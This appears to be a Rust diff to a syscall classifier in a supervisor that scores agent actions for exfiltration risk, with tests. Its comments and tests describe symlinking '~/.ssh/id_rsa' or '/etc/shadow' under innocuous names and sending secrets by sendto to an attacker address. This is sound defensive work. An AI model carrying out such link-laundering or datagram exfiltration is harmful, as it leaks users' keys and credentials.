@@ -62,6 +62,18 @@ pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
             path: Some(path), ..
         } => Some(ToolCallType::FileRead { path: path.clone() }),
         SyscallKind::FileDelete { path } => Some(ToolCallType::FileDelete { path: path.clone() }),
+        // Link creation. `ToolCallType::path()` returns the target, so every
+        // path-based filter scores what the link exposes rather than the
+        // benign new name (go-live review B2/B3).
+        SyscallKind::FileLink {
+            target,
+            link_path,
+            symbolic,
+        } => Some(ToolCallType::FileLink {
+            target: target.clone(),
+            link_path: link_path.clone(),
+            symbolic: *symbolic,
+        }),
         SyscallKind::FileRename { old_path, new_path } => Some(ToolCallType::FileRename {
             old_path: old_path.clone(),
             new_path: new_path.clone(),
@@ -84,10 +96,28 @@ pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
             address: address.clone(),
             port: *port,
         }),
-        // Raw-socket sendto (AF_PACKET / AF_NETLINK): the address was set by
-        // classify.rs to "raw:af_packet" / "raw:af_netlink". Map through to
-        // NetConnect so the egress filter can evaluate and deny it.
+        // Raw-socket sendto (AF_PACKET): classify.rs labelled the address
+        // "raw:af_packet". Map through to NetConnect so the egress filter can
+        // evaluate and deny it. AF_NETLINK is allowed upstream (kernel
+        // messaging), so it never reaches here as a "raw:" address.
         SyscallKind::NetSendTo { address, port } if address.starts_with("raw:") => {
+            Some(ToolCallType::NetConnect {
+                address: address.clone(),
+                port: *port,
+            })
+        }
+        // Explicit-destination datagram send on an *unconnected* socket
+        // (go-live review B13). This was noise, so
+        // `sendto(fd, secret, ..., &attacker_addr, ...)` egressed to an
+        // arbitrary destination with no evaluation and no audit record — the
+        // same hole as the connected-write path, reached without even needing
+        // a connect. Surfaced as NetConnect so it flows through the existing
+        // egress path unchanged.
+        //
+        // A send with no explicit destination arrives here with an empty
+        // address: that is a connected socket, already surfaced against its
+        // recorded peer before classification.
+        SyscallKind::NetSendTo { address, port } if is_scorable_datagram_destination(address) => {
             Some(ToolCallType::NetConnect {
                 address: address.clone(),
                 port: *port,
@@ -103,11 +133,23 @@ pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
         // event_handler before reaching here. Match explicitly so an
         // accidental routing-through is a compile-time error.
         SyscallKind::KernelModuleOp { .. } | SyscallKind::KexecLoad { .. } => None,
+        // Self-filter install is decided in event_handler before classification
+        // (deny the NEW_LISTENER escape, observe-or-allow the rest). Matched
+        // explicitly so it never falls into the auto-allow catch-all.
+        SyscallKind::SeccompInstall { .. } => None,
         // PR 6 Phase D: ArchPrivilegedOp is hard-denied in
         // event_handler before reaching here.
         SyscallKind::ArchPrivilegedOp { .. } => None,
+        // Go-live review B1: ForeignAbiSyscall is hard-denied in
+        // event_handler before reaching here. Matched explicitly — the
+        // catch-all below means "not security-relevant", which the handler
+        // turns into a silent allow, so letting a fail-closed variant reach
+        // it would invert its meaning. Note this is defence in depth, not a
+        // compile-time guarantee — the `_ =>` catch-all below still exists,
+        // so removing this arm would silently restore the auto-allow.
+        SyscallKind::ForeignAbiSyscall { .. } => None,
         // PR 6 Phase B: category-2 syscalls map to dedicated
-        // ToolCallType variants. operation_risk scores +5.0 baseline
+        // ToolCallType variants. operation-risk scores +5.0 baseline
         // → QUEUE by default. Profile capability grants can lower.
         SyscallKind::OwnershipChange {
             path,
@@ -140,7 +182,7 @@ pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
         // `event_handler.rs` short-circuits this to a silent allow
         // when the calling binary is on the profile's
         // `namespace_users` list. When that carveout doesn't match,
-        // the call reaches the proxy and `operation_risk` scores
+        // the call reaches the proxy and `operation-risk` scores
         // +5.0 → QUEUE.
         SyscallKind::NamespaceOp { syscall, flags } => Some(ToolCallType::NamespaceOp {
             syscall: format!("{syscall:?}").to_ascii_lowercase(),
@@ -149,6 +191,61 @@ pub fn to_tool_call_type(kind: &SyscallKind) -> Option<ToolCallType> {
         // Filtered out: fd-only reads/writes without path, ProcessFork,
         // regular NetSendTo (connected datagrams), PipeCreate, SocketPair
         _ => None,
+    }
+}
+
+/// True when an explicit datagram destination is worth scoring as egress
+/// (go-live review B13).
+///
+/// Excluded, because scoring them would cost prompts without closing an
+/// exfiltration path:
+///
+/// * **Empty** — a connected socket with no explicit destination. Already
+///   surfaced against its recorded peer before this point.
+/// * **Unix sockets and bare paths** — not network egress.
+/// * **Loopback and unspecified** — not egress at all, and the bulk of
+///   datagram volume (DNS to `127.0.0.53`, local services).
+/// * **Link-local multicast and broadcast** — mDNS (`224.0.0.251`,
+///   `ff02::fb`), SSDP (`239.255.255.250`) and DHCP discovery. These cannot
+///   cross a router, so they do not reach an attacker-controlled host, and
+///   they are emitted routinely by desktop and container tooling.
+///
+/// Everything else — any routable unicast address, and any multicast wide
+/// enough to leave the segment — is scored.
+fn is_scorable_datagram_destination(address: &str) -> bool {
+    if address.is_empty() || address.starts_with("unix:") || address.starts_with('/') {
+        return false;
+    }
+    let Ok(ip) = address.parse::<std::net::IpAddr>() else {
+        // A hostname here would be unusual (sendto takes a sockaddr), but an
+        // unparseable destination is not something to wave through.
+        return true;
+    };
+    if ip.is_loopback() || ip.is_unspecified() {
+        return false;
+    }
+    match ip {
+        std::net::IpAddr::V4(v4) => {
+            if v4.is_broadcast() {
+                return false;
+            }
+            // 224.0.0.0/24 — the link-local multicast block (mDNS, LLMNR).
+            if v4.is_multicast() && v4.octets()[..3] == [224, 0, 0] {
+                return false;
+            }
+            // 239.255.255.250 — SSDP/UPnP discovery.
+            if v4.octets() == [239, 255, 255, 250] {
+                return false;
+            }
+            true
+        }
+        std::net::IpAddr::V6(v6) => {
+            if let Some(mapped) = v6.to_ipv4_mapped() {
+                return is_scorable_datagram_destination(&mapped.to_string());
+            }
+            // ff02::/16 — link-local scope multicast.
+            !(v6.is_multicast() && v6.segments()[0] & 0xff0f == 0xff02)
+        }
     }
 }
 
@@ -646,13 +743,26 @@ mod tests {
         );
     }
 
+    /// Was `net_send_to_is_filtered`, which asserted that a datagram send to
+    /// an explicit remote destination was noise. That is the go-live review
+    /// B13 hole: it let `sendto(fd, secret, ..., &attacker_addr, ...)` egress
+    /// with no evaluation and no audit record. A send to a real host — even a
+    /// LAN resolver like this one — is egress and gets scored; the session
+    /// allowlist and a profile's `routine_destinations` keep it from
+    /// re-prompting.
     #[test]
-    fn net_send_to_is_filtered() {
+    fn net_send_to_explicit_destination_is_scored() {
         let kind = SyscallKind::NetSendTo {
             address: "10.0.0.1".into(),
             port: 53,
         };
-        assert_eq!(to_tool_call_type(&kind), None);
+        assert_eq!(
+            to_tool_call_type(&kind),
+            Some(ToolCallType::NetConnect {
+                address: "10.0.0.1".into(),
+                port: 53,
+            })
+        );
     }
 
     #[test]
@@ -670,21 +780,6 @@ mod tests {
                 port: 0,
             }),
             "raw:af_packet sendto must be mapped to NetConnect for proxy evaluation"
-        );
-    }
-
-    #[test]
-    fn net_send_to_raw_af_netlink_maps_to_net_connect() {
-        let kind = SyscallKind::NetSendTo {
-            address: "raw:af_netlink".into(),
-            port: 0,
-        };
-        assert_eq!(
-            to_tool_call_type(&kind),
-            Some(ToolCallType::NetConnect {
-                address: "raw:af_netlink".into(),
-                port: 0,
-            })
         );
     }
 
@@ -1116,5 +1211,148 @@ mod tests {
         assert!(is_sensitive_path(
             "/home/u/proj/node_modules_decoy/auth-token.txt"
         ));
+    }
+
+    // ── B2: link creation maps to FileLink, scored by target ──────────
+
+    #[test]
+    fn symlink_maps_to_file_link_preserving_direction() {
+        let kind = SyscallKind::FileLink {
+            target: "/home/u/.ssh/id_rsa".into(),
+            link_path: "/tmp/notes.txt".into(),
+            symbolic: true,
+        };
+        assert_eq!(
+            to_tool_call_type(&kind),
+            Some(ToolCallType::FileLink {
+                target: "/home/u/.ssh/id_rsa".into(),
+                link_path: "/tmp/notes.txt".into(),
+                symbolic: true,
+            })
+        );
+    }
+
+    #[test]
+    fn hard_link_maps_to_file_link_with_symbolic_false() {
+        let kind = SyscallKind::FileLink {
+            target: "/etc/shadow".into(),
+            link_path: "/tmp/s".into(),
+            symbolic: false,
+        };
+        match to_tool_call_type(&kind) {
+            Some(ToolCallType::FileLink { symbolic, .. }) => assert!(!symbolic),
+            other => panic!("expected FileLink, got {other:?}"),
+        }
+    }
+
+    /// The whole point of the variant: path-based filters must see what the
+    /// link exposes, not the innocuous name it is exposed under. If this
+    /// ever returns the link path, `ln -s ~/.ssh/id_rsa /tmp/x` scores as a
+    /// write to `/tmp/x` and the laundering is invisible again.
+    #[test]
+    fn file_link_context_path_is_the_target() {
+        let call = to_tool_call_type(&SyscallKind::FileLink {
+            target: "/home/u/.ssh/id_rsa".into(),
+            link_path: "/tmp/notes.txt".into(),
+            symbolic: true,
+        })
+        .expect("link must map to a tool call type");
+        let ctx = grith_proxy::types::ToolCallContext::new(
+            "supervisor".to_string(),
+            call,
+            uuid::Uuid::new_v4(),
+        );
+        assert_eq!(ctx.path(), Some("/home/u/.ssh/id_rsa"));
+    }
+}
+#[cfg(test)]
+mod b13_sendto_tests {
+    use super::*;
+
+    /// The exfiltration path: an explicit destination on an unconnected
+    /// datagram socket must reach the egress filters.
+    #[test]
+    fn explicit_remote_sendto_is_scored_as_egress() {
+        let kind = SyscallKind::NetSendTo {
+            address: "203.0.113.7".into(),
+            port: 4444,
+        };
+        assert_eq!(
+            to_tool_call_type(&kind),
+            Some(ToolCallType::NetConnect {
+                address: "203.0.113.7".into(),
+                port: 4444,
+            }),
+            "sendto to an arbitrary remote host must be evaluated, not treated as noise"
+        );
+    }
+
+    #[test]
+    fn ipv6_remote_sendto_is_scored() {
+        let kind = SyscallKind::NetSendTo {
+            address: "2001:db8::1".into(),
+            port: 53,
+        };
+        assert!(to_tool_call_type(&kind).is_some());
+    }
+
+    /// A connected send carries no explicit destination; the connected-peer
+    /// path surfaces it before classification, so scoring it here would
+    /// double-count.
+    #[test]
+    fn connected_send_without_destination_stays_noise() {
+        let kind = SyscallKind::NetSendTo {
+            address: String::new(),
+            port: 0,
+        };
+        assert_eq!(to_tool_call_type(&kind), None);
+    }
+
+    /// FP guards: routine local and discovery traffic must not prompt.
+    #[test]
+    fn local_and_discovery_destinations_stay_noise() {
+        for (address, port) in [
+            ("127.0.0.53", 53u16),     // systemd-resolved
+            ("127.0.0.1", 8080),       // local service
+            ("::1", 53),               // loopback v6
+            ("0.0.0.0", 0),            // unspecified
+            ("224.0.0.251", 5353),     // mDNS
+            ("224.0.0.252", 5355),     // LLMNR
+            ("ff02::fb", 5353),        // mDNS v6
+            ("239.255.255.250", 1900), // SSDP
+            ("255.255.255.255", 67),   // DHCP broadcast
+            ("::ffff:127.0.0.1", 53),  // IPv4-mapped loopback
+        ] {
+            let kind = SyscallKind::NetSendTo {
+                address: address.into(),
+                port,
+            };
+            assert_eq!(
+                to_tool_call_type(&kind),
+                None,
+                "{address}:{port} is routine local traffic and must not prompt"
+            );
+        }
+    }
+
+    /// Routable multicast is not link-local and can leave the segment.
+    #[test]
+    fn routable_multicast_is_scored() {
+        let kind = SyscallKind::NetSendTo {
+            address: "233.252.0.1".into(),
+            port: 9999,
+        };
+        assert!(to_tool_call_type(&kind).is_some());
+    }
+
+    #[test]
+    fn unix_datagram_sends_stay_noise() {
+        for address in ["unix:/run/user/1000/bus", "/tmp/sock"] {
+            let kind = SyscallKind::NetSendTo {
+                address: address.into(),
+                port: 0,
+            };
+            assert_eq!(to_tool_call_type(&kind), None);
+        }
     }
 }
